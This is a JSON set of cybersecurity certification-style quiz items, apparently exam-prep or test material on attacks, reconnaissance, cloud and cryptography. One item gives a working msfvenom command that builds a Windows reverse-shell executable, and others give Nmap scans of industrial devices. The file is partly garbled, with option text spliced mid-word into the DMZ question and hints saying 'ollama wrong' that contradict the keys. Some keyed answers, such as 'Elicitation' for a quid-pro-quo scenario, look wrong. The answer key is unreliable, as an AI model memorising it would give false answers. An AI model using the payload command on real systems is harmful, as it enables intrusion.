    "options": [
      "Logical interface",
      "Physical security",
      "DMZ",
      "Administrative safeguards"
    ]
  },
  {
    "question": "CompanyXYZ has asked you to assess the security of their perimeter email gateway. From your office in New York, you craft a specially formatted email message and send it across the Internet to an employee of CompanyXYZ. The employee of CompanyXYZ is aware of your test. Your email message looks like this:   From: jim_muller@CompanyXYZ.com  To: michelle_sunder@CompanyXYZ.com Subject: Test Message  Date: 5/6/2021 17:38  The employee of CompanyXYZ receives your email message. This proves that CompanyXYZ's email gateway doesn't prevent what?",
    "answer": "Email Spoofing",
    "hint": "The email appears to be from a valid company address but is sent externally.",
    "options": [
      "Email Harvesting",
      "Email Phishing",
      "Email Masquerading",
      "Email Spoofing"
    ]
  },
  {
    "question": "Bob, a system administrator at TPNQM SA, conclude\"Bob is partially right. DMZ does not make sense when a stateless firewall is available\"d one day that a DMZ is not needed if he properly configures the firewall to allow access just to servers/ports, which can have direct internet access, and block the access to workstations. Bob also concluded that DMZ makes sense just when a stateful firewall is available, which is not the case of TPNQM SA.  In this context, what can you say?",
    "answer": "Bob is totally wrong. DMZ is always relevant when the company has internet servers and workstations",
    "hint": "DMZ relevance depends on type of firewall ollama wrong: Bob is partially right. DMZ does not make sense when a stateless firewall is available",
    "options": [
      "Bob is partially right. He does not need to separate networks if he can create rules by destination IPs, one by one",
      "Bob is partially right. DMZ does not make sense when a stateless firewall is available",
      "Bob is totally wrong. DMZ is always relevant when the company has internet servers and workstations",
      "Bob can be right since DMZ does not make sense when combined with stateless firewalls"
    ]
  },
  {
    "question": "Which of the following commands checks for valid users on an SMTP server?",
    "answer": "VRFY",
    "hint": "Used to verify if a user exists",
    "options": [
      "VRFY",
      "CHK",
      "EXPN",
      "RCPT"
    ]
  },
  {
    "question": "Wilson, a professional hacker, targets an organization for financial benefit and plans to compromise its systems by sending malicious emails. For this purpose, he uses a tool to track the emails of the target and extracts information such as sender identities, mail servers, sender IP addresses, and sender locations from different public sources. He also checks if an email address was leaked using the haveibeenpwned.com API.  Which of the following tools is used by Wilson in the above scenario?",
    "answer": "Infoga",
    "hint": "This tool gathers information from public sources.",
    "options": [
      "Netcraft",
      "Factiva",
      "ZoomInfo",
      "Infoga"
    ]
  },
  {
    "question": "Bob, an attacker, has managed to access a target IoT device. He employed an online tool to gather information related to the model of the IoT device and the certifications granted to it.  Which of the following tools did Bob employ to gather the above information?",
    "answer": "FCC ID search",
    "hint": "The FCC ID search tool is used to gather information on devices and their certifications.",
    "options": [
      "EarthExplorer",
      "Google image search",
      "FCC ID search",
      "search.com"
    ]
  },
  {
    "question": "A penetration tester is performing the footprinting process and is reviewing publicly available information about an organization by using the Google search engine.  Which of the following advanced operators would allow the pen tester to restrict the search to the organization’s web domain?",
    "answer": "[site:]",
    "hint": "[site:] restricts the search to a specific domain",
    "options": [
      "[site:]",
      "[location:]",
      "[allinurl:]",
      "[link:]"
    ]
  },
  {
    "question": "Annie, a cloud security engineer, uses the Docker architecture to employ a client/server model in the application she is working on. She utilizes a component that can process API requests and handle various Docker objects, such as containers, volumes, images, and networks.  What is the component of the Docker architecture used by Annie in the above scenario?",
    "answer": "Docker Daemon",
    "hint": "It processes API requests and handles various Docker objects.",
    "options": [
      "Docker objects",
      "Docker registries",
      "Docker Daemon",
      "Docker Client"
    ]
  },
  {
    "question": "You are a penetration tester working to test the user awareness of the employees of the client XYZ. You harvested two employees’ emails from some public sources and are creating a client-side backdoor to send it to the employees via email.  Which stage of the cyber kill chain are you at?",
    "answer": "Weaponization",
    "hint": "This is the step where malware or a backdoor payload is created.",
    "options": [
      "Weaponization",
      "Exploitation",
      "Command and control",
      "Reconnaissance"
    ]
  },
  {
    "question": "Sam is working as a system administrator in an organization. He captured the principal characteristics of a vulnerability and produced a numerical score to reflect its severity using CVSS v3.0 to properly assess and prioritize the organization’s vulnerability management processes. The base score that Sam obtained after performing CVSS rating was 4.0.  What is the CVSS severity level of the vulnerability discovered by Sam in the above scenario?",
    "answer": "Medium",
    "hint": "The base score range for 'medium' severity is between 4.0 and 6.9",
    "options": [
      "high",
      "Medium",
      "low",
      "Ciritical"
    ]
  },
  {
    "question": "John wants to send Marie an email that includes sensitive information, and he does not trust the network that he is connected to. Marie gives him the idea of using PGP. What should John do to communicate correctly using this type of encryption?",
    "answer": "Use Marie’s public key to encrypt the message.",
    "hint": "John should use Marie's public key to ensure only she can read it.",
    "options": [
      "Use his own public key to encrypt the message.",
      "Use his own private key to encrypt the message.",
      "Use Marie’s private key to encrypt the message.",
      "Use Marie’s public key to encrypt the message."
    ]
  },
  {
    "question": "The network users are complaining because their systems are slowing down. Further, every time they attempt to go to a website, they receive a series of pop-ups with advertisements. What type of malware have the systems been infected with?",
    "answer": "adware",
    "hint": "Ads and slowdown suggest adware.",
    "options": [
      "trojan",
      "spyware",
      "adware",
      "virus"
    ]
  },
  {
    "question": "SQL injection (SQLi) attacks attempt to inject SQL syntax into web requests, which may bypass authentication and allow attackers to access and/or modify data attached to a web application.  Which of the following SQLi types leverages a database server’s ability to make DNS requests to pass data to an attacker?",
    "answer": "Out-band SQLi",
    "hint": "This type of SQL injection leverages external channels for data exfiltration.",
    "options": [
      "Out-band SQLi",
      "In-band SQLi",
      "Time-based blind SQLi",
      "Union-based SQLi"
    ]
  },
  {
    "question": "Which type of virus can change its own code and then cipher itself multiple times as it replicates?",
    "answer": "Encryption virus",
    "hint": "This type of virus can modify its own code to evade detection.",
    "options": [
      "Cavity virus",
      "Stealth virus",
      "Tunneling  Virus",
      "Encryption virus"
    ]
  },
  {
    "question": "What is the port to block first in case you are suspicious that an IoT device has been compromised?",
    "answer": "48101",
    "hint": "IoT devices often use high port numbers like this for communication.",
    "options": [
      "443",
      "48101",
      "80",
      "22"
    ]
  },
  {
    "question": "What is the correct way of using MSFvenom to generate a reverse TCP shellcode for Windows?",
    "answer": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.30 LPORT=4444 -f exe > shell.exe",
    "hint": "-f exe is used to output an executable file.",
    "options": [
      "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.30 LPORT=4444 -f c",
      "msfvenom -p windows/meterpreter/reverse_tcp RHOST=10.10.10.30 LPORT=4444 -f exe > shell.exe",
      "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.30 LPORT=4444 -f exe > shell.exe",
      "msfvenom -p windows/meterpreter/reverse_tcp RHOST=10.10.10.30 LPORT=4444 -f c"
    ]
  },
  {
    "question": "Samuel, a security administrator, is assessing the configuration of a web server. He noticed that the server permits SSLv2 connections, and the same private key certificate is used on a different server that allows SSLv2 connections. This vulnerability makes the web server vulnerable to attacks as the SSLv2 server can leak key information.  Which of the following attacks can be performed by exploiting the above vulnerability?",
    "answer": "DROWN attack",
    "hint": "The DROWN (Decrypting RSA with Obsolete and Weakened eNcryption) attack exploits vulnerabilities in SSLv2.",
    "options": [
      "DROWN attack",
      "Padding oracle attack",
      "DUHK attack",
      "Side-channel attack"
    ]
  },
  {
    "question": "Techno Security Inc. recently hired John as a penetration tester. He was tasked with identifying open ports in the target network and determining whether the ports are online and any firewall rule sets are encountered.  John decided to perform a TCP SYN ping scan on the target network.  Which of the following Nmap commands must John use to perform the TCP SYN ping scan?",
    "answer": "nmap -sn -PS < target IP address >",
    "hint": "-PS is the option for a TCP SYN ping scan",
    "options": [
      "nmap -sn -PP < target IP address >",
      "nmap -sn -PA < target IP address >",
      "nmap -sn -PO < target IP address >",
      "nmap -sn -PS < target IP address >"
    ]
  },
  {
    "question": "Bob, an attacker, has managed to access a target IoT device. He employed an online tool to gather information related to the model of the IoT device and the certifications granted to it. Which of the following tools did Bob employ to gather the above information?",
    "answer": "FCC ID search",
    "hint": "Tool related to certifications and model identification",
    "options": [
      "EarthExplorer",
      "search.com",
      "FCC ID search",
      "Google image search"
    ]
  },
  {
    "question": "Jim, a professional hacker, targeted an organization that is operating critical industrial infrastructure. Jim used Nmap to scan open ports and running services on systems connected to the organization’s OT network. He used an Nmap command to identify Ethernet/IP devices connected to the Internet and further gathered information such as the vendor name, product code and name, device name, and IP address. Which of the following Nmap commands helped Jim retrieve the required information?",
    "answer": "nmap -Pn -sU -p 44818 --script enip-info <Target IP>",
    "hint": "--script enip-info is used for Ethernet/IP devices",
    "options": [
      "nmap -Pn -sT -p 102 --script s7-info <Target IP>",
      "nmap -Pn -sT -p 46824 <Target IP>",
      "nmap -Pn -sU -p 44818 --script enip-info <Target IP>",
      "nmap -Pn -sT --scan-delay 1s --max-parallelism 1 -p <Port List> <Target IP>"
    ]
  },
  {
    "question": "An organization has automated the operation of critical infrastructure from a remote location. For this purpose, all the industrial control systems are connected to the Internet. To empower the manufacturing process, ensure the reliability of industrial networks, and reduce downtime and service disruption, the organization decided to install an OT security tool that further protects against security incidents such as cyber espionage, zero-day attacks, and malware. Which of the following tools must the organization employ to protect its critical infrastructure?",
    "answer": "Flowmon",
    "hint": "Flowmon is a network monitoring and security tool suitable for industrial networks.",
    "options": [
      "Flowmon",
      "Robotium",
      "IntentFuzzer",
      "BalenaCloud"
    ]
  },
  {
    "question": "Richard, an attacker, aimed to hack IoT devices connected to a target network. In this process, Richard recorded the frequency required to share information between connected devices. After obtaining the frequency, he captured the original data when commands were initiated by the connected devices. Once the original data were collected, he used free tools such as URH to segregate the command sequence. Subsequently, he started injecting the segregated command sequence on the same frequency into the IoT network, which repeats the captured signals of the devices. What is the type of attack performed by Richard in the above scenario?",
    "answer": "Replay attack",
    "hint": "The attack involves capturing and retransmitting signals.",
    "options": [
      "Cryptanalysis attack",
      "﻿Side-channel attack",
      "Reconnaissance attack",
      "Replay attack"
    ]
  },
  {
    "question": "Alice, a professional hacker, targeted an organization’s cloud services. She infiltrated the target’s MSP provider by sending spear-phishing emails and distributed custom-made malware to compromise user accounts and gain remote access to the cloud service. Further, she accessed the target customer profiles with her MSP account, compressed the customer data, and stored them in the MSP. Then, she used this information to launch further attacks on the target organization.  Which of the following cloud attacks did Alice perform in the above scenario?",
    "answer": "Cloud hopper attack",
    "hint": "Alice compromised the MSP to access customer data",
    "options": [
      "Cloudborne attack",
      "Cloud cryptojacking",
      "Man-in-the-cloud (MITC) attack",
      "Cloud hopper attack"
    ]
  },
  {
    "question": "John, a professional hacker, targeted an organization that uses LDAP for accessing distributed directory services. He used an automated tool to anonymously query the LDAP service for sensitive information such as usernames, addresses, departmental details, and server names to launch further attacks on the target organization.  What is the tool employed by John to gather information from the LDAP service?",
    "answer": "JXplorer",
    "hint": "Tool used for exploring and searching LDAP directories",
    "options": [
      "Zabasearch",
      "JXplorer",
      "Earthexplorer",
      "ike-scan"
    ]
  },
  {
    "question": "Richard, an attacker, targets an MNC. In this process, he uses a footprinting technique to gather as much information as possible. Using this technique, he gathers domain information such as the target domain name, contact details of its owner, expiry date, and creation date. With this information, he creates a map of the organization’s network and misleads domain owners with social engineering to obtain internal details of its network.  What type of footprinting technique is employed by Richard?",
    "answer": "Whois footprinting",
    "hint": "This involves gathering domain information.",
    "options": [
      "Email footprinting",
      "VoIP footprinting",
      "VPN footprinting",
      "Whois footprinting"
    ]
  },
  {
    "question": "Johnson, an attacker, performed online research for the contact details of reputed cybersecurity firms. He found the contact number of sibertech.org and dialed the number, claiming himself to represent a technical support team from a vendor. He warned that a specific server is about to be compromised and requested sibertech.org to follow the provided instructions. Consequently, he prompted the victim to execute unusual commands and install malicious files, which were then used to collect and pass critical information to Johnson’s machine.  What is the social engineering technique Steve employed in the above scenario?",
    "answer": "Elicitation",
    "hint": "Johnson offers a service or information exchange. Ollamw wrong Quiz pro quo",
    "options": [
      "Diversion theft",
      "Phishing",
      "Quid pro quo",
      "Elicitation"
    ]
  },
  {
    "question": "In an attempt to increase the security of your network, you implement a solution that will help keep your wireless network undiscoverable and accessible only to those that know it.  How do you accomplish this?",
    "answer": "Disable SSID broadcasting",
    "hint": "Makes your Wi-Fi hidden from public view",
    "options": [
      "Remove all passwords",
      "Delete the wireless network",
      "Lock all users",
      "Disable SSID broadcasting"
    ]
  },
  {
    "question": "Jane invites her friends Alice and John over for a LAN party. Alice and John access Jane’s wireless network without a password. However, Jane has a long, complex password on her router. What attack has likely occurred?",
    "answer": "Evil Twin",
    "hint": "This involves unauthorized access to a wireless network. ollama wrong Piggybacking",
    "options": [
      "Evil Twin",
      "Piggybacking",
      "Wireless sniffing",
      "Wardriving"
    ]
  },
  {
    "question": "To create a botnet, the attacker can use several techniques to scan vulnerable machines. The attacker first collects information about a large number of vulnerable machines to create a list. Subsequently, they infect the machines. The list is divided by assigning half of the list to the newly compromised machines. The scanning process runs simultaneously. This technique ensures the spreading and installation of malicious code in little time.  Which technique is discussed here?",
    "answer": "Hit-list scanning technique.",
    "hint": "This hint refers to the creation and use of a list.",
    "options": [
      "Permutation scanning technique",
      "Hit-list scanning technique.",
      "Subnet scanning technique",
      "Topological scanning technique"
    ]
  },
  {
    "question": "Louis, a professional hacker, had used specialized tools or search engines to encrypt all his browsing activity and navigate anonymously to obtain sensitive/hidden information about official government or federal databases. After gathering the information, he successfully performed an attack on the target government organization without being traced.  Which of the following techniques is described in the above scenario?",
    "answer": "Dark web footprinting",
    "hint": "The use of specialized tools for anonymous browsing and access to sensitive information points towards the dark web.",
    "options": [
      "VoIP footprinting",
      "Website footprinting",
      "Dark web footprinting",
      "VPN footprinting"
    ]
  },
  {
    "question": "An organization is performing a vulnerability assessment for mitigating threats. James, a pen tester, scanned the organization by building an inventory of the protocols found on the organization’s machines to detect which ports are attached to services such as an email server, a web server, or a database server. After identifying the services, he selected the vulnerabilities on each machine and started executing only the relevant tests.  What is the type of vulnerability assessment solution that James employed in the above scenario?",
    "answer": "Service-based solutions",
    "hint": "Focus on services like email server or web server",
    "options": [
      "Tree-based assessment",
      "Product-based solutions",
      "Service-based solutions",
      "Inference-based assessment"
    ]
  },
  {
    "question": "There are multiple cloud deployment options depending on how isolated a customer’s resources are from those of other customers. Shared environments share the costs and allow each customer to enjoy lower operations expenses. One solution is for a customer to join with a group of users or organizations to share a cloud environment. What is this cloud deployment option called?",
    "answer": "Community",
    "hint": "This option involves sharing resources among specific groups.",
    "options": [
      "Public",
      "Private",
      "Hybrid",
      "Community"
    ]
  },
  {
    "question": "Alice, a professional hacker, targeted an organization’s cloud services. She infiltrated the target’s MSP provider by sending spear-phishing emails and distributed custom-made malware to compromise user accounts and gain remote access to the cloud service. Further, she accessed the target customer profiles with her MSP account, compressed the customer data, and stored them in the MSP. Then, she used this information to launch further attacks on the target organization. Which of the following cloud attacks did Alice perform in the above scenario?",
    "answer": "Cloud hopper attack",
    "hint": "Alice infiltrated the MSP provider to gain access",
    "options": [
      "Cloud cryptojacking",
      "Man-in-the-cloud (MITC) attack",
      "Cloud hopper attack",
      "Cloudborne attack"
    ]
  },
  {
    "question": "Eric, a cloud security engineer, implements a technique for securing the cloud resources used by his organization. This technique assumes by default that a user attempting to access the network is not an authentic entity and verifies every incoming connection before allowing access to the network. Using this technique, he also imposed conditions such that employees can access only the resources required for their role. What is the technique employed by Eric to secure cloud resources?",
    "answer": "Zero trust network",
    "hint": "Security model that assumes breach and verifies each request.",
    "options": [
      "Zero trust network",
      "Container technology",
      "Demilitarized zone",
      "Serverless computing"
    ]
  },
  {
    "question": "Abel, a cloud architect, uses container technology to deploy applications/software including all its dependencies, such as libraries and configuration files, binaries, and other resources that run independently from other processes in the cloud environment. For the containerization of applications, he follows the five-tier container technology architecture. Currently, Abel is verifying and validating image contents, signing images, and sending them to the registries. Which of the following tiers of the container technology architecture is Abel currently working in?",
    "answer": "Tier-2: Testing and accreditation systems",
    "hint": "Abel is verifying and validating image contents.",
    "options": [
      "Tier-3: Registries",
      "Tier-1: Developer machines",
      "Tier-2: Testing and accreditation systems",
      "Tier-4: Orchestrators"
    ]
  },
  {
    "question": "Heather’s company has decided to use a new customer relationship management tool. After performing the appropriate research, they decided to purchase a subscription to a cloud-hosted solution. The only administrative task that Heather will need to perform is the management of user accounts. The provider will take care of the hardware, operating system, and software administration including patching and monitoring. Which of the following is this type of solution?",
    "answer": "SaaS",
    "hint": "Software as a Service (SaaS) involves the provider managing hardware and software.",
    "options": [
      "PaaS",
      "IaaS",
      "SaaS",
      "CaaS"
    ]
  },
  {
    "question": "Harald is sending a digitally signed email to Poly. With which key is Harald signing this message and how is Poly validating it?",
    "answer": "Harald is signing the message with his private key, and Poly will verify that the message came from Harald  by using Harald ’s public key.",
    "hint": "Digital signatures use sender's private key for signing.",
    "options": [
      "Harald is signing the message with his public key, and Poly will verify that the message came from Harald by using Harald ’s private key.",
      "Harald  is signing the message with Poly’s public key, and Poly will verify that the message came from Harald by using Harald ’s public key.",
      "Harald  is signing the message with Poly’s private key, and Poly will verify that the message came from Harald by using Harald ’s public key.",
      "Harald is signing the message with his private key, and Poly will verify that the message came from Harald  by using Harald ’s public key."
    ]
  },
  {
    "question": "At what stage of the cyber kill chain theory model does data exfiltration occur?",
    "answer": "Actions on objectives",
    "hint": "This stage involves the adversary achieving their goals.",
    "options": [
      "Actions on objectives",
      "Command and control",
      "Weaponization",
      "Installation"
    ]
  }
]